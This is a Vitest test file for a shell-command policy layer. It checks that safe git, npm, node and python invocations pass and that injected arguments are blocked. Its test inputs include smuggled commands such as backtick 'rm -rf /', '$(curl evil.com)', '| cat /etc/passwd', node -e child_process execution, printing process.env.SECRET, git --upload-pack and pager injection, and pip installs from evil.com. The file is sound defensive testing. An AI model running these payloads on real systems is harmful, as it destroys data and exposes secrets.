/**
 * AUD-2026-02-27-03: Security tests for shell:runCommand policy layer.
 * Covers blocked commands, path traversal, argument injection, and rate limiting.
 */
import { validateCommandArgs } from '@main/utils/shell-command-policy.util';
import { describe, expect, it } from 'vitest';

describe('shell-command-policy.util', () => {
    describe('validateCommandArgs – allowed commands', () => {
        it('should allow basic git status', () => {
            const result = validateCommandArgs('git', ['status']);
            expect(result.allowed).toBe(true);
        });

        it('should allow git log with safe flags', () => {
            const result = validateCommandArgs('git', ['log', '--oneline', '-n', '10']);
            expect(result.allowed).toBe(true);
        });

        it('should allow npm install', () => {
            const result = validateCommandArgs('npm', ['install']);
            expect(result.allowed).toBe(true);
        });

        it('should allow docker ps', () => {
            const result = validateCommandArgs('docker', ['ps', '-a']);
            expect(result.allowed).toBe(true);
        });

        it('should allow cargo build', () => {
            const result = validateCommandArgs('cargo', ['build', '--release']);
            expect(result.allowed).toBe(true);
        });
    });

    describe('validateCommandArgs – shell injection', () => {
        it('should block backtick injection', () => {
            const result = validateCommandArgs('git', ['status', '`rm -rf /`']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('shell injection');
        });

        it('should block $() subshell injection', () => {
            const result = validateCommandArgs('npm', ['install', '$(curl evil.com)']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('shell injection');
        });

        it('should block ${} variable expansion', () => {
            const result = validateCommandArgs('git', ['clone', '${HOME}']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('shell injection');
        });

        it('should block pipe operator', () => {
            const result = validateCommandArgs('git', ['log', '| cat /etc/passwd']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('shell injection');
        });

        it('should block semicolon chaining', () => {
            const result = validateCommandArgs('git', ['status', '; rm -rf /']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('shell injection');
        });

        it('should block redirect operators', () => {
            const result = validateCommandArgs('npm', ['list', '> /tmp/out']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('shell injection');
        });

        it('should block ampersand background operator', () => {
            const result = validateCommandArgs('git', ['status', '& malicious']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('shell injection');
        });

        it('should block null bytes', () => {
            const result = validateCommandArgs('git', ['status\0injected']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('shell injection');
        });

        it('should block exclamation mark (history expansion)', () => {
            const result = validateCommandArgs('git', ['log', '!command']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('shell injection');
        });
    });

    describe('validateCommandArgs – path traversal', () => {
        it('should block ../ path traversal', () => {
            const result = validateCommandArgs('git', ['add', '../../etc/passwd']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('path traversal');
        });

        it('should block ..\\ Windows-style path traversal', () => {
            const result = validateCommandArgs('git', ['add', '..\\..\\windows\\system32']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('path traversal');
        });

        it('should block single ../ traversal', () => {
            const result = validateCommandArgs('npm', ['install', '../malicious-package']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('path traversal');
        });

        it('should allow paths without traversal', () => {
            const result = validateCommandArgs('git', ['add', 'src/main/index.ts']);
            expect(result.allowed).toBe(true);
        });

        it('should allow absolute paths without traversal', () => {
            const result = validateCommandArgs('node', ['C:/projects/app/index.js']);
            expect(result.allowed).toBe(true);
        });
    });

    describe('validateCommandArgs – git-specific policy', () => {
        it('should block git --exec flag', () => {
            const result = validateCommandArgs('git', ['rebase', '--exec', 'rm -rf /']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('git flag');
        });

        it('should block git --upload-pack', () => {
            const result = validateCommandArgs('git', ['fetch', '--upload-pack', 'evil']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('git flag');
        });

        it('should block git --receive-pack', () => {
            const result = validateCommandArgs('git', ['push', '--receive-pack', 'evil']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('git flag');
        });

        it('should block git -c config injection', () => {
            const result = validateCommandArgs('git', ['-c', 'core.pager=malicious']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('git flag');
        });

        it('should block git -ccore.pager=cmd inline config', () => {
            const result = validateCommandArgs('git', ['-ccore.pager=malicious']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('git inline config');
        });

        it('should block git --exec-path', () => {
            const result = validateCommandArgs('git', ['--exec-path=/tmp/evil', 'status']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('git flag');
        });

        it('should block git remote-http subcommand', () => {
            const result = validateCommandArgs('git', ['remote-http', 'https://evil.com']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('git subcommand');
        });

        it('should allow safe git subcommands', () => {
            expect(validateCommandArgs('git', ['status']).allowed).toBe(true);
            expect(validateCommandArgs('git', ['log']).allowed).toBe(true);
            expect(validateCommandArgs('git', ['diff', 'HEAD']).allowed).toBe(true);
            expect(validateCommandArgs('git', ['branch', '-a']).allowed).toBe(true);
            expect(validateCommandArgs('git', ['add', '.']).allowed).toBe(true);
        });
    });

    describe('validateCommandArgs – node/python eval prevention', () => {
        it('should block node -e (inline eval)', () => {
            const result = validateCommandArgs('node', ['-e', 'require("child_process").exec("rm -rf /")']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('eval/exec flag');
        });

        it('should block node --eval', () => {
            const result = validateCommandArgs('node', ['--eval', 'process.exit()']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('eval/exec flag');
        });

        it('should block python -c (inline code)', () => {
            const result = validateCommandArgs('python', ['-c', 'print("pwned")']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('eval/exec flag');
        });

        it('should block python3 -c', () => {
            const result = validateCommandArgs('python3', ['-c', 'print("pwned")']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('eval/exec flag');
        });

        it('should block python -m (module execution)', () => {
            const result = validateCommandArgs('python', ['-m', 'http.server']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('eval/exec flag');
        });

        it('should block node --print', () => {
            const result = validateCommandArgs('node', ['--print', 'process.env.SECRET']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('eval/exec flag');
        });

        it('should allow node with a file path', () => {
            const result = validateCommandArgs('node', ['scripts/build.js']);
            expect(result.allowed).toBe(true);
        });

        it('should allow python with a file path', () => {
            const result = validateCommandArgs('python', ['scripts/run.py']);
            expect(result.allowed).toBe(true);
        });
    });

    describe('validateCommandArgs – pip policy', () => {
        it('should block pip install from untrusted index', () => {
            const result = validateCommandArgs('pip', ['--index-url', 'https://evil.com/simple']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('eval/exec flag');
        });

        it('should block pip --extra-index-url', () => {
            const result = validateCommandArgs('pip', ['--extra-index-url', 'https://evil.com']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('eval/exec flag');
        });

        it('should block pip3 -i (short index flag)', () => {
            const result = validateCommandArgs('pip3', ['-i', 'https://evil.com']);
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('eval/exec flag');
        });
    });

    describe('validateCommandArgs – edge cases', () => {
        it('should allow empty args array', () => {
            const result = validateCommandArgs('git', []);
            expect(result.allowed).toBe(true);
        });

        it('should handle case-insensitive executable matching', () => {
            const result = validateCommandArgs('GIT', ['--exec', 'evil']);
            expect(result.allowed).toBe(false);
        });

        it('should block combined injection in one arg', () => {
            const result = validateCommandArgs('npm', ['test; curl evil.com']);
            expect(result.allowed).toBe(false);
        });

        it('should truncate long args in reason messages', () => {
            const longArg = 'A'.repeat(200) + '|inject';
            const result = validateCommandArgs('git', [longArg]);
            expect(result.allowed).toBe(false);
            // Reason should not contain the full 200+ char string
            expect(result.reason).toBeDefined();
            expect(result.reason!.length).toBeLessThan(200);
        });
    });
});
